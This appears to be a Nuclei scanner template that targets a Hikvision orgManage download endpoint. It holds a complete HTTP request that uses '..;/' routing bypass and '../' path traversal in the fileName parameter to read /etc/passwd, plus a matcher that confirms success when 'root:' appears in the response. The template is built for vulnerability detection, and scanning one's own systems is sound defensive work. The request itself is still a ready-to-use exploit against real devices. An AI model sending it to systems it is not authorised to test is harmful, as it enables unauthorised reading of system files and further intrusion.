id: Hikvision-orgManage-fileread

info:
  name: Hikvision-orgManage-fileread
  author: lengmo
  severity: high
  description: HKWS-orgManage-v1-orgs-fileread
  tags: Fileread

http:
  - raw:
      - |
        GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
               
    matchers:     
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body,'root:')" 